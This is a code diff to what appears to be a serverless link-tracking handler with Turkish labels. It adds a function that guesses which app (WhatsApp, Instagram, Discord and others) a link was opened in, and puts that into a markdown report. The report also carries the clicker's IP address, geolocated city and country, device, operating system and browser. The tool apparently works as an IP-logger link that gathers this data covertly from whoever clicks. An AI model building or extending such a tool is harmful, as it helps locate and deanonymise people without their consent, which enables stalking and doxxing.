@@ -14,6 +14,47 @@ function fetchJSON(url) {
   });
 }
 
+function detectApp(ua, referrer) {
+  const checks = [
+    [/WhatsApp/i, 'WhatsApp'],
+    [/Instagram/i, 'Instagram'],
+    [/FBAN|FBAV|Facebook/i, 'Facebook'],
+    [/Messenger/i, 'Facebook Messenger'],
+    [/Telegram/i, 'Telegram'],
+    [/Twitter|Tweetbot/i, 'Twitter/X'],
+    [/Discord/i, 'Discord'],
+    [/LinkedIn/i, 'LinkedIn'],
+    [/Snapchat/i, 'Snapchat'],
+    [/TikTok/i, 'TikTok'],
+    [/Pinterest/i, 'Pinterest'],
+    [/Reddit/i, 'Reddit'],
+    [/Signal/i, 'Signal'],
+    [/Skype/i, 'Skype'],
+    [/Viber/i, 'Viber'],
+    [/LINE/i, 'LINE'],
+    [/MicroMessenger/i, 'WeChat'],
+    [/Kik/i, 'Kik'],
+    [/GroupMe/i, 'GroupMe'],
+    [/okhttp/i, 'Android Uygulama'],
+    [/^https?:\/\/(?:www\.)?(?:l\.)?instagram\.com/i, 'Instagram'],
+    [/^https?:\/\/(?:www\.)?(?:m\.)?facebook\.com/i, 'Facebook'],
+    [/^https?:\/\/(?:www\.)?twitter\.com/i, 'Twitter/X'],
+    [/^https?:\/\/(?:www\.)?t\.co/i, 'Twitter/X'],
+    [/^https?:\/\/(?:www\.)?reddit\.com/i, 'Reddit'],
+    [/^https?:\/\/(?:www\.)?linkedin\.com/i, 'LinkedIn'],
+    [/^https?:\/\/(?:www\.)?tiktok\.com/i, 'TikTok'],
+    [/^https?:\/\/(?:www\.)?pinterest\.com/i, 'Pinterest'],
+    [/^https?:\/\/(?:www\.)?snapchat\.com/i, 'Snapchat'],
+    [/^https?:\/\/(?:www\.)?wa\.me|api\.whatsapp/i, 'WhatsApp'],
+    [/^https?:\/\/l\.facebook\.com/i, 'Facebook'],
+    [/^https?:\/\/(?:www\.)?youtube\.com/i, 'YouTube'],
+  ];
+  for (const [pattern, name] of checks) {
+    if (pattern.test(ua) || pattern.test(referrer)) return name;
+  }
+  return referrer || 'Doğrudan / Bilinmiyor';
+}
+
 function postJSON(url, payload) {
   return new Promise((resolve, reject) => {
     const data = JSON.stringify(payload);
@@ -45,7 +86,7 @@ module.exports = async (req, res) => {
       '',
       '**IP :** ' + ip,
       '**Konum :** ' + (geo.city ? geo.city + ', ' + geo.country : 'Bilinmiyor'),
-      '**Linke Tıklanan Uygulama :** ' + referrer,
+      '**Linke Tıklanan Uygulama :** ' + detectApp(uaStr, referrer),
       '**Cihaz :** ' + (device.vendor || device.model || 'Bilinmiyor') + (device.model ? ' ' + device.model : ''),
       '**İşletim Sistemi :** ' + (os.name || 'Bilinmiyor') + (os.version ? ' ' + os.version : ''),
       '**Tarayıcı :** ' + (browser.name || 'Bilinmiyor') + (browser.version ? ' ' + browser.version : ''),
